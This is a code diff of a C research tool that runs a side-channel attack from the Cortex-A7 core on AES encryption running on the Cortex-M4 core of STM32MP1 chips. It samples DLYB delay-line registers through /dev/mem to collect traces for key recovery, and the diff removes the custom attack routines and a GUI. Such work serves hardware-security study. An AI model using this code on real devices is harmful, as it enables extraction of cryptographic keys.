@@ -1,3 +1,19 @@
+/**
+******************************************************************************
+* @file           : main_cortex_A7.c
+* @brief          : CA7-to-CM4 side-channel attack using DLYB blocks in
+* 					STM32MP1 SoCs
+******************************************************************************
+* @attention
+*
+* Copyright (c) Joseph Gravellier 2020 Thales.
+* Email: joseph.gravellier@gmail.com
+* All rights reserved.
+*
+*
+******************************************************************************
+*/
+
 #define _GNU_SOURCE
 #include "main_cortex_A7.h"
 
@@ -29,102 +45,10 @@ uint32_t SDMMC_CLK = 0;
 uint32_t v_base_addr = 0;
 uint32_t v_ddr_base_addr = 0;
 
-/*static void
-print_hello (GtkWidget *widget,
-             gpointer   data)
-{
-  g_print ("Hello World\n");
-}
-
-
-static void
-activate (GtkApplication *app,
-          gpointer        user_data)
-{
-    GtkWidget *window;
-    GtkWidget *grid;
-    GtkWidget *button[4];
-    GtkWidget *progress_bar;
-
-    window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
-    gtk_window_set_default_size(GTK_WINDOW(window), 320, 200);
-    gtk_window_set_title(GTK_WINDOW(window), "Les GtkTable");
-    g_signal_connect(G_OBJECT(window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
-
-    grid =  gtk_grid_new ();
-
-
-    button[0]= gtk_button_new_with_label("Bouton 1");
-    button[1]= gtk_button_new_with_label("Bouton 2");
-    button[2]= gtk_button_new_with_label("Bouton 3");
-    button[3]= gtk_button_new_with_label("Bouton 4");
-
-
-    gtk_grid_attach(GTK_GRID(grid), button[0],0, 0, 1, 1);
-    gtk_grid_attach(GTK_GRID(grid), button[1],0, 1, 1, 1);
-    gtk_grid_attach(GTK_GRID(grid), button[2],1, 0, 1, 1);
-    gtk_grid_attach(GTK_GRID(grid), button[3],1, 1, 1, 1);
-
-
-    progress_bar = gtk_progress_bar_new ();
-    gtk_grid_attach_next_to (GTK_GRID (grid),
-                               progress_bar,
-                               button[3],
-                               GTK_POS_RIGHT, 1, 1);
-
-    //add callback on button[3]
-    //g_signal_connect (GTK_BUTTON (button[3]), "clicked",
-    //                  G_CALLBACK (on_button_click), progress_bar);
-
-    gtk_container_add (GTK_CONTAINER (window), GTK_WIDGET (grid));
-
-    gtk_widget_show_all(window);
-
-  GtkWidget *window;
-  GtkWidget *viewButton;
-  GtkWidget *varButton;
-  GtkWidget *autoButton;
-  GtkWidget *viewButton_box;
-
-
-  window = gtk_application_window_new (app);
-  gtk_window_set_title (GTK_WINDOW (window), "Window");
-  gtk_window_set_default_size (GTK_WINDOW (window), 300, 300);
-
-  viewButton_box = gtk_button_box_new (GTK_ORIENTATION_VERTICAL);
-  gtk_container_add (GTK_CONTAINER (window), viewButton_box);
-
-  viewButton = gtk_button_new_with_label ("View");
-  g_signal_connect (viewButton, "clicked", G_CALLBACK (print_hello), NULL);
-  g_signal_connect_swapped (viewButton, "clicked", G_CALLBACK (gtk_widget_destroy), window);
-  gtk_container_add (GTK_CONTAINER (viewButton_box), viewButton);
-
-  //varButton_box = gtk_button_box_new (GTK_ORIENTATION_HORIZONTAL);
-  //gtk_container_add (GTK_CONTAINER (window), varButton_box);
-
-  varButton = gtk_button_new_with_label ("Var");
-  g_signal_connect (varButton, "clicked", G_CALLBACK (print_hello), NULL);
-  g_signal_connect_swapped (varButton, "clicked", G_CALLBACK (gtk_widget_destroy), window);
-  gtk_container_add (GTK_CONTAINER (viewButton_box), varButton);
-
-  //autoButton_box = gtk_button_box_new (GTK_ORIENTATION_HORIZONTAL);
-  //gtk_container_add (GTK_CONTAINER (window), autoButton_box);
-
-  autoButton = gtk_button_new_with_label ("Auto");
-  g_signal_connect (autoButton, "clicked", G_CALLBACK (GTK_Auto), autoButton);
-  //g_signal_connect_swapped (autoButton, "clicked", G_CALLBACK (gtk_widget_destroy), window);
-  gtk_container_add (GTK_CONTAINER (viewButton_box), autoButton);
-
-  gtk_widget_show_all (window);
-}*/
-
 /*
  * Main function
  */
 int main(int argc, char *argv[]) {
-
-	//GtkApplication *app;
-	//int status;
 
 	double variance = 0.;
 	double mean = 0.;
@@ -164,7 +88,7 @@ int main(int argc, char *argv[]) {
     printf("virtual DLYB_CFGR address: %08x\n\r",DLYB_CFGR);
     printf("virtual SDMMC_CLK address: %08x\n\r",SDMMC_CLK);
 
-    //Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
+    Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
 
 	/* Print Hello Banner */
 	printf("\n\r\n\r");
@@ -175,12 +99,6 @@ int main(int argc, char *argv[]) {
 	"/___/_/\\_,_/\\__/_/_/_//_/\\__/  on AES\n\r");
 
 	Command_Helper();
-
-	//gtk
-	//app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
-	//g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
-	//status = g_application_run (G_APPLICATION (app), argc, argv);
-	//g_object_unref (app);
 
 	do{
 
@@ -278,70 +196,6 @@ int main(int argc, char *argv[]) {
 				}
 			}
 		}
-		else if((strcmp(user_input,"aescustom")==0) || (strcmp(user_input,"AESCUSTOM")==0))
-		{
-			uint8_t custom_dl = 41;
-			uint8_t custom_clk = 0;
-			double custom_max = 2.5;
-			double custom_min = 1.5;
-
-			uint8_t exKeyArray[16] = {0x2d,0xcf,0x46,0x29,0x04,0xb4,0x78,0xd8,0x68,0xa7,0xff,0x3f,0x2b,0xf1,0xfc,0xd9};
-
-			iTrace = 0;
-
-			//Reset communication with CM4
-			Write_Register(v_ddr_base_addr,0x0);
-
-			// Number of DLYB samples to acquire per trace (default 400)
-			user_input = strtok(NULL," ");
-			nSample = (user_input == NULL)?400:atoi(user_input);
-			printf("nSample: %d\n\r",nSample);
-
-			// Number of trace to acquire (default 100)
-			user_input = strtok(NULL," ");
-			nTrace = (user_input == NULL)?100:atoi(user_input);
-			printf("nTrace: %d\n\r",nTrace);
-
-			//Send DMA parameters to CM4
-			Write_Register(v_ddr_base_addr+0x30,nSample);
-
-			// Print key used by CM4 for the example
-			printf("\n\rkey : ");
-			for(int k_i = 0 ; k_i < 16 ; k_i++){printf("%02x",exKeyArray[k_i]);}
-			printf("\n\r");
-
-			//Modify SDMMC2 frequency to clkval
-			Modify_Register(SDMMC_CLK,currentCLKval,0x2ff);
-
-			while(1)
-			{
-				mean = Get_Mean_Custom(100,custom_dl,custom_clk);
-
-				if(mean >= custom_max)
-				{
-					printf("Too hot ! - mean : %f\n\r",mean);
-					usleep(10000);
-				}
-				else if((mean > custom_min) && (mean < custom_max))
-				{
-					printf("attack\n\r");
-					AES_DMA_Attack_Custom(currentDLval,nSample);
-					iTrace++;
-				}
-				else
-				{
-					printf("\n\rToo cold ! - mean : %f",mean);
-					Increase_Temperature(1000);
-				}
-
-				if(iTrace == nTrace)
-				{
-					printf("\n\rEnd acquisition!\n\r");
-					break;
-				}
-			}
-
-		}
 		else if((strcmp(user_input,"aes")==0) || (strcmp(user_input,"AES")==0))
 		{
 			uint8_t exKeyArray[16] = {0x2d,0xcf,0x46,0x29,0x04,0xb4,0x78,0xd8,0x68,0xa7,0xff,0x3f,0x2b,0xf1,0xfc,0xd9};
@@ -360,14 +214,14 @@ int main(int argc, char *argv[]) {
 			nTrace = (user_input == NULL)?10:atoi(user_input);
 			printf("\n\rnTrace: %d",nTrace);
 
-			// Enable CPA calculation (default 1 enable)
+			// Enable CPA calculation (default 1 disabled)
 			user_input = strtok(NULL," ");
-			localCPA = (user_input == NULL)?1:atoi(user_input);
+			localCPA = (user_input == NULL)?0:atoi(user_input);
 			printf("\n\rnlocalCPA: %d",localCPA);
 
-			// Enable Butterworth Filter (default 1 enable)
+			// Enable Butterworth Filter (default 1 disabled)
 			user_input = strtok(NULL," ");
-			eFilter = (user_input == NULL)?1:atoi(user_input);
+			eFilter = (user_input == NULL)?0:atoi(user_input);
 			printf("\n\rFilter: %d",eFilter);
 
 			// Print info
@@ -508,81 +362,6 @@ int main(int argc, char *argv[]) {
 
 }
 
-uint32_t AES_DMA_Attack_Custom(uint8_t dlval,uint32_t nSample)
-{
-		uint32_t ptArray[4];
-		uint32_t ctArray[4];
-		uint32_t iSample = 0;
-		uint32_t dataArray[nSample];
-		double mean = 0.;
-
-		Write_Register(v_ddr_base_addr,0x1); //Re-init communication
-
-		//Disable the length sampling by setting SEN bit to ‘0’.
-		Write_Register(DLYB_CR,0x1);
-
-		//Enable the length sampling by setting SEN bit to ‘1’.
-		Write_Register(DLYB_CR,0x3);
-
-		//Enable all delay cells by setting SEL bits to DLYB_LENGTH and set UNIT to dlval and re-launch LENGTH SAMPLING
-		Write_Register(DLYB_CFGR,0xc + (dlval << 8));
-
-		// Generate random plain text and print it
-		for(int u = 0; u<4 ; u++){ptArray[u] = (uint32_t)rand();}
-
-		Write_Register(v_ddr_base_addr+0x4,ptArray[0]); //send 32bit pt0 to CM4
-		Write_Register(v_ddr_base_addr+0x8,ptArray[1]); //send 32bit pt1 to CM4
-		Write_Register(v_ddr_base_addr+0xc,ptArray[2]); //send 32bit pt2 to CM4
-		Write_Register(v_ddr_base_addr+0x10,ptArray[3]); //send 32bit pt3 to CM4
-
-		while(Read_Register(v_ddr_base_addr) != 2){} // Wait for CM4 *ready to encrypt*
-
-		//clock1 = clock();
-		Write_Register(v_ddr_base_addr,0x3); //send *start* to CM4
-		//usleep(200);
-		while(Read_Register(v_ddr_base_addr) != 4){} //Wait for CM4 *end of encrypt*
-		//clock2 = clock();
-
-		//Disable the length sampling by setting SEN bit to ‘0’.
-		Write_Register(DLYB_CR,0x1);
-
-		//usleep(1);
-
-		//ctArray[0] = Read_Register(v_ddr_base_addr+0x14); //read 32bit ct0 from CM4
-		//ctArray[1] = Read_Register(v_ddr_base_addr+0x18); //read 32bit ct1 from CM4
-		//ctArray[2] = Read_Register(v_ddr_base_addr+0x1c); //read 32bit ct2 from CM4
-		//ctArray[3] = Read_Register(v_ddr_base_addr+0x20); //read 32bit ct3 from CM4
-		for(int i = 0 ; i < nSample ; i++)
-		{
-			dataArray[i] = Read_Register(v_ddr_base_addr+0x40+i*4);
-			mean += Decode_DelayLine_Custom(dataArray[i],dlval);
-		}
-
-		mean = mean/nSample;
-
-		if((mean > 1.5) && (mean < 2.5))
-		{
-			printf("\n\rplaintext : ");
-			for(int u = 0; u<4 ; u++){printf("%08x",ptArray[u]);}
-			printf("\n\r");
-
-			for(int i = 0 ; i < nSample ; i++)
-			{
-			printf("%c",Decode_DelayLine_Custom(dataArray[i],dlval)+50);
-			}
-
-			//printf("\n\rciphertext : ");
-			//for(int u = 0; u<4 ; u++){printf("%08x",ctArray[u]);}
-		}
-		else
-		{
-			//printf("\n\rmean: %f",mean);
-		}
-
-
-		return 1;
-}
-
 uint32_t AES_DMA_attack_Auto(uint32_t nSample)
 {
 		uint8_t ptArray[16];
@@ -664,6 +443,9 @@ uint32_t AES_DMA_attack_Auto(uint32_t nSample)
 				{
 					printf("%c",dataArray[iSample]+50);
 				}
+
+				printf("\n\rciphertext : ");
+				for(int u = 0; u<16 ; u++){printf("%02x",ctArray[u]);}
 			}
 			else
 			{
@@ -729,195 +511,9 @@ uint32_t AES_DMA_attack_Auto(uint32_t nSample)
 		return 1;
 }
 
-
-
-uint32_t AES_attack_Custom(uint8_t dlval, uint32_t sumSample, uint32_t iTrace)
-{
-		uint32_t ptArray[4];
-		uint32_t ctArray[4];
-		uint32_t lngArray[100];
-		uint32_t iSample = 0;
-		double meanSample=0.;
-
-		Write_Register(v_ddr_base_addr,0x1); //Re-init communication
-
-		//Disable the length sampling by setting SEN bit to ‘0’.
-		Write_Register(DLYB_CR,0x1);
-
-		//Enable the length sampling by setting SEN bit to ‘1’.
-		Write_Register(DLYB_CR,0x3);
-
-		//Enable all delay cells by setting SEL bits to DLYB_LENGTH and set UNIT to dlval and re-launch LENGTH SAMPLING
-		Write_Register(DLYB_CFGR,0xc + (dlval << 8));
-
-		// Generate random plain text and print it
-		for(int u = 0; u<4 ; u++){ptArray[u] = (uint32_t)rand();}
-
-		Write_Register(v_ddr_base_addr+0x4,ptArray[0]); //send 32bit pt0 to CM4
-		Write_Register(v_ddr_base_addr+0x8,ptArray[1]); //send 32bit pt1 to CM4
-		Write_Register(v_ddr_base_addr+0xc,ptArray[2]); //send 32bit pt2 to CM4
-		Write_Register(v_ddr_base_addr+0x10,ptArray[3]); //send 32bit pt3 to CM4
-
-		while(Read_Register(v_ddr_base_addr) != 2){} // Wait for CM4 *ready to encrypt*
-		//clock1 = clock();
-
-		Write_Register(v_ddr_base_addr,0x3); //send start to CM4
-
-
-		while(Read_Register(v_ddr_base_addr) != 4){//Wait for CM4 *end of encrypt*
-
-			lngArray[iSample++] = Read_Register(DLYB_CFGR);
-		}
-		//clock2 = clock();
-
-		//Disable the length sampling by setting SEN bit to ‘0’.
-		Write_Register(DLYB_CR,0x1);
-
-		usleep(1);
-
-		ctArray[0] = Read_Register(v_ddr_base_addr+0x14); //read 32bit ct0 from CM4
-		ctArray[1] = Read_Register(v_ddr_base_addr+0x18); //read 32bit ct1 from CM4
-		ctArray[2] = Read_Register(v_ddr_base_addr+0x1c); //read 32bit ct2 from CM4
-		ctArray[3] = Read_Register(v_ddr_base_addr+0x20); //read 32bit ct3 from CM4
-
-		if(iTrace > 1000)
-		{
-			meanSample = sumSample / iTrace;
-		}
-		//printf("sumSample: %d\n\r",sumSample);
-
-		if((iSample <= (int)meanSample+1) && (iSample >= (int)meanSample-1))
-		{
-			printf("\n\rplaintext : ");
-			for(int u = 0; u<4 ; u++){printf("%08x",ptArray[u]);}
-			printf("\n\r");
-			for(int i = 0 ; i < iSample ; i++)
-			{
-				printf("%c",Decode_DelayLine_Custom(Read_Register(v_ddr_base_addr+0x40+i*4),dlval)+50);
-			}
-
-			printf("\n\rciphertext : ");
-			for(int u = 0; u<4 ; u++){printf("%08x",ctArray[u]);}
-			//printf("nb_cycles: %d",clock2-clock1);
-		}
-
-		return iSample;
-}
-
-double Get_Mean_Custom(uint32_t nSample,uint8_t dlval,uint8_t clkval)
-{
-		double mean = 0.0;
-		int lngArray[nSample];
-
-		//Modify SDMMC2 frequency to max
-		Modify_Register(SDMMC_CLK,clkval,0x2ff);
-
-		//Disable the length sampling by setting SEN bit to ‘0’.
-		Write_Register(DLYB_CR,0x1);
-
-		while(((Read_Register(DLYB_CR)>>1)&0x1)!=0){}
-
-		//Enable the length sampling by setting SEN bit to ‘1’.
-		Write_Register(DLYB_CR,0x3);
-
-		while(((Read_Register(DLYB_CR)>>1)&0x1)==0){}
-
-		//Enable all delay cells by setting SEL bits to DLYB_LENGTH and set UNIT to dlval and re-launch LENGTH SAMPLING
-		Write_Register(DLYB_CFGR,0xc + (dlval << 8));
-
-		//Start the acquisition of the delay-line
-		for(int iSample = 0 ; iSample < nSample ; iSample ++)
-		{
-			lngArray[iSample] = Read_Register(DLYB_CFGR);
-		}
-
-		for(int iSample = 0 ; iSample < nSample ; iSample ++)
-		{
-		mean += Decode_DelayLine_Custom(lngArray[iSample],dlval);
-		}
-
-		return mean/nSample;
-}
-
-
-
-uint8_t Decode_DelayLine_Custom(uint32_t reg,uint8_t dlval)
-{
-	uint8_t temp = 0;
-
-	if(dlval == 119)
-	{
-		for(uint8_t iNibble = 0 ; iNibble < 3 ; iNibble++)
-		{
-			switch((reg>>(16+iNibble*4))&0xF)
-			{
-				case 0x8:
-					temp = temp + 9;
-					break;
-				case 0xc:
-					temp = temp + 8;
-					break;
-				case 0xe:
-					temp = temp + 7;
-					break;
-				case 0x4:
-					temp = temp + 6;
-					break;
-				case 0x6:
-					temp = temp + 5;
-					break;
-				case 0x7:
-					temp = temp + 4;
-					break;
-				case 0x2:
-					temp = temp + 3;
-					break;
-				case 0x3:
-					temp = temp + 2;
-					break;
-				case 0x1:
-					temp = temp + 1;
-					break;
-				case 0x0:
-					temp = temp + 0;
-					break;
-				default:
-					printf("error");
-					break;
-			}
-		}
-	}
-	else if(dlval == 41)
-	{
-
-		for(uint8_t itdc = 0 ; itdc < 2 ; itdc++)
-		{
-			switch((reg>>(16+itdc*6))&0x3F)
-			{
-				case 0b111100:
-					temp = temp + 2;
-					break;
-				case 0b111000:
-					temp = temp + 1;
-					break;
-				case 0b110000:
-					temp = temp + 0;
-					break;
-				default:
-					printBits(6,(reg>>(16+itdc*6))&0x3F);
-					printf("\n\r");
-					break;
-			}
-		}
-	}
-	else
-	{
-		printf("DLvar error\n\r");
-	}
-
-	return temp;
-}
-
+/*
+ * Command helper that can be called with "help" or "?" command
+ */
 void Command_Helper(void)
 {
 	printf("\n\rCommand Helper:");
@@ -929,12 +525,14 @@ void Command_Helper(void)
 	printf("\n\r| view      | <nSample>                          | print DLYB state     |");
 	printf("\n\r| var       |                                    | Compute variance     |");
 	printf("\n\r| auto      | <regValue>                         | Find adequate value  |");
-	printf("\n\r| control   |                                    | Control temperature  |");
-	printf("\n\r| aes       | <nSample> <nTrace>                 | Launch AES attack    |");
+	printf("\n\r| aes       | <nSample> <nTrace> <eCPA> <eFilter>| Launch AES attack    |");
 	printf("\n\r-------------------------------------------------------------------------");
 	printf("\n\r\n\rexample : \"view 10\" = print 10 times DLYB state \n\r\n\r");
 }
 
+/*
+ * Launch CM4 encryption application
+ */
 void Init_CM4(char * filename)
 {
 	char linux_cmd[200];
@@ -953,6 +551,9 @@ void Init_CM4(char * filename)
 	system("echo start > /sys/class/remoteproc/remoteproc0/state");
 }
 
+/*
+ * Obtain virtual addresses to control hardware registers
+ */
 int Map_Registers(int *fd, void **c, int c_addr, int c_size)
 {
 if ((*fd = open("/dev/mem", O_RDWR | O_SYNC)) == -1) {
@@ -970,9 +571,3 @@ return -1;
 return 0;
 }
 
-/*void GTK_Auto(GtkWidget *widget,gpointer   data)
-{
-	gtk_widget_set_sensitive (widget, FALSE);
-	Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
-	gtk_widget_set_sensitive (widget, TRUE);
-}*/
